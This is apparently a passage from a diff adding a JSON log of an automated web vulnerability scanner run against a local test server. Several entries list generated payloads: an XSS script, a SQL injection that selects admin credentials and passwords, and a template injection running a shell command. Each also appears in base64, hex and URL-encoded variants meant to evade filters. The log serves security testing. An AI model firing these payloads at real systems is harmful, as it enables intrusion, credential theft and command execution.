+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781975434.24418,
+    "scan_id": "HIVE-V5-3da3a67ab8",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "005691c3-3be0-4a14-be78-4cf94624f0a3",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781975436.264411,
+    "scan_id": "HIVE-V5-3da3a67ab8",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "aae13335-2917-472e-990d-e04201359e8e",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781975440.9540489,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "96ab691b-4677-4a5e-87f3-43b9ebc2b5dd",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781975445.8175948,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "e56aff2f-8620-46e8-b285-b0a2ab6e63f6",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781975449.6815195,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "03eace2d-eccf-4990-a4f4-0f6f2b2aa675",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781975471.399466,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "ef61a105-244c-49ec-b6a9-d8d32925cca3",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781975477.968187,
+    "scan_id": "HIVE-V5-3da3a67ab8",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "67c7ca7c-56f5-4569-aa07-e1bb747a5513",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781975479.5714083,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "fb24247f-b061-4d20-a006-d1430eee0224",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781975481.5922832,
+    "scan_id": "HIVE-V5-3da3a67ab8",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "dab19f78-25e2-402f-9b26-683db431d3a1",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781976377.8050575,
+    "scan_id": "HIVE-V5-8619beb1fb",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "01635535-6324-4d20-bfde-2a79023a77e9",
+      "status": "SUCCESS",
+      "module_id": "alpha_v6_recon"
+    }
+  },
+  {
+    "timestamp": 1781976377.9594586,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "475e3cb1-8350-4617-8fdc-8afeeafcb9d7",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976378.421163,
+    "scan_id": "HIVE-V5-8619beb1fb",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "35f57097-fa3e-4b05-8047-49442f94c2cb",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781976378.9911554,
+    "scan_id": "HIVE-V5-8619beb1fb",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "7a11a003-24f8-4fd1-9d55-63f6c6cdcdaa",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781976379.6103015,
+    "scan_id": "HIVE-V5-8619beb1fb",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "d483cbb8-eb57-4b7d-af00-a70e133c10d5",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781976379.8729155,
+    "scan_id": "HIVE-V5-8619beb1fb",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "e7ff4e02-6b44-4f9d-b0d1-975a61846f97",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781976380.7118018,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "f6b7b83e-8c02-4ecd-996c-9e59bf76d28b",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976380.943385,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "4864b9d1-0ff0-487f-8f50-77080c025d2a",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976381.0615332,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "6c6ec92b-a879-4f5d-bb89-0b90b19a8960",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976384.6034493,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "7dbbe474-8fc9-49b1-af02-6ebb28d15994",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976385.5522537,
+    "scan_id": "HIVE-V5-8619beb1fb",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "5f9a53d3-b59c-4914-b391-d3a9e4ca87e4",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781976386.521269,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "f32c09dd-338e-4302-8c56-1d1f6965a421",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976386.9993577,
+    "scan_id": "HIVE-V5-8619beb1fb",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "a68a0058-6ba9-4797-afc8-905d300797be",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781976882.8218038,
+    "scan_id": "HIVE-V5-a67028e34e",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "5d3c62df-2d9d-4f43-a361-8e7dc57cf94f",
+      "status": "SUCCESS",
+      "module_id": "alpha_v6_recon"
+    }
+  },
+  {
+    "timestamp": 1781976882.9382386,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "f3e3b7c8-66b2-4987-9788-3368957366aa",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976883.4161792,
+    "scan_id": "HIVE-V5-a67028e34e",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "51d3edc5-0ceb-40a9-a075-cab5ba3d3b30",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781976883.5004814,
+    "scan_id": "HIVE-V5-a67028e34e",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "ee3cdfac-2b73-428b-b2dc-33e78c4b5e61",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781976886.0153422,
+    "scan_id": "HIVE-V5-a67028e34e",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "d1d698f6-363d-40f5-b356-fccc99b8bfba",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781976886.5024505,
+    "scan_id": "HIVE-V5-a67028e34e",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "ec8fb977-1440-4e55-9328-0875b708a772",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781976886.7246814,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "acd65b83-1a4d-4b21-af31-eff7167ddcd1",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976886.8527634,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "465a92ed-f6cf-4782-a1f4-b9eae0590355",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976887.0221448,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "2912f92b-a048-412c-a8bf-8a9eccd06569",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976896.6892407,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "d5fe0f14-5a40-4158-b3ed-0f31ca682e45",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976897.753281,
+    "scan_id": "HIVE-V5-a67028e34e",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "98ca72f0-261c-48fd-bc03-d01fdd38a43a",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781976897.880377,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "7f3826e7-2a28-4d7c-8459-38fb8a875c70",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781976898.0130057,
+    "scan_id": "HIVE-V5-a67028e34e",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "de857010-341a-4536-811d-ff3d301c14fb",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781977540.1526554,
+    "scan_id": "HIVE-V5-78d334345b",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "bf78398d-4b3c-4ecf-86c6-bc114d88c470",
+      "status": "SUCCESS",
+      "module_id": "alpha_v6_recon"
+    }
+  },
+  {
+    "timestamp": 1781977546.164107,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "049d64de-c2cb-46d4-a692-95d9f529a283",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781977559.243076,
+    "scan_id": "HIVE-V5-78d334345b",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "9eb3c562-3e2e-423d-8715-ce0a22e2f6be",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781977560.8258915,
+    "scan_id": "HIVE-V5-78d334345b",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "8f38fa65-f8b0-4d18-9dc5-d5b73f881a59",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781977566.181335,
+    "scan_id": "HIVE-V5-78d334345b",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "0fa7af2d-c609-4909-bd44-81792035637b",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781977575.5675392,
+    "scan_id": "HIVE-V5-78d334345b",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "1fb43b78-c16e-4fe0-99df-c95a863979d9",
+      "status": "SUCCESS",
+      "target_url": "http://localhost:8080",
+      "target_headers": {},
+      "data": {
+        "generated_payloads": [
+          "<script>alert('XSS_BY_SIGMA')</script>",
+          "PHNjcmlwdD5hbGVydCgnWFNTX0JZX1NJR01BJyk8L3NjcmlwdD4=",
+          "0x3c0x730x630x720x690x700x740x3e0x610x6c0x650x720x740x280x270x580x530x530x5f0x420x590x5f0x530x490x470x4d0x410x270x290x3c0x2f0x730x630x720x690x700x740x3e",
+          "%3Cscript%3Ealert%28%27XSS_BY_SIGMA%27%29%3C/script%3E",
+          "UNION SELECT admin_creds, password FROM users--",
+          "VU5JT04gU0VMRUNUIGFkbWluX2NyZWRzLCBwYXNzd29yZCBGUk9NIHVzZXJzLS0=",
+          "0x550x4e0x490x4f0x4e0x200x530x450x4c0x450x430x540x200x610x640x6d0x690x6e0x5f0x630x720x650x640x730x2c0x200x700x610x730x730x770x6f0x720x640x200x460x520x4f0x4d0x200x750x730x650x720x730x2d0x2d",
+          "UNION%20SELECT%20admin_creds%2C%20password%20FROM%20users--",
+          "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+          "e3tjeWNsZXIuX19pbml0X18uX19nbG9iYWxzX18ub3MucG9wZW4oJ2lkJykucmVhZCgpfX0=",
+          "0x7b0x7b0x630x790x630x6c0x650x720x2e0x5f0x5f0x690x6e0x690x740x5f0x5f0x2e0x5f0x5f0x670x6c0x6f0x620x610x6c0x730x5f0x5f0x2e0x6f0x730x2e0x700x6f0x700x650x6e0x280x270x690x640x270x290x2e0x720x650x610x640x280x290x7d0x7d",
+          "%7B%7Bcycler.__init__.__globals__.os.popen%28%27id%27%29.read%28%29%7D%7D"
+        ]
+      }
+    }
+  },
+  {
+    "timestamp": 1781977576.0273743,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "def9e258-5a33-40ee-916a-d74adefdd864",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781977576.3886795,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "9b04931b-e919-4183-a8f4-873b5a5f57d0",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781977577.1873507,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "6e6cf374-9c6d-488e-ad9f-f2fde7e5e0a3",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781977596.946433,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "3d0e5a22-b9b2-43c7-842b-384223abf09e",
+      "status": "SUCCESS"
+    }
+  },
+  {
+    "timestamp": 1781977600.1790614,
+    "scan_id": "HIVE-V5-78d334345b",
+    "message": "Background job completed",
+    "payload": {
+      "job_id": "93b9fe11-3e9d-4498-bc37-a0b9e6eb025d",
+      "status": "SUCCESS",
+      "vulnerabilities": []
+    }
+  },
+  {
+    "timestamp": 1781977600.48799,
+    "scan_id": "GLOBAL",
+    "message": "Background job completed",
+    "payload": {
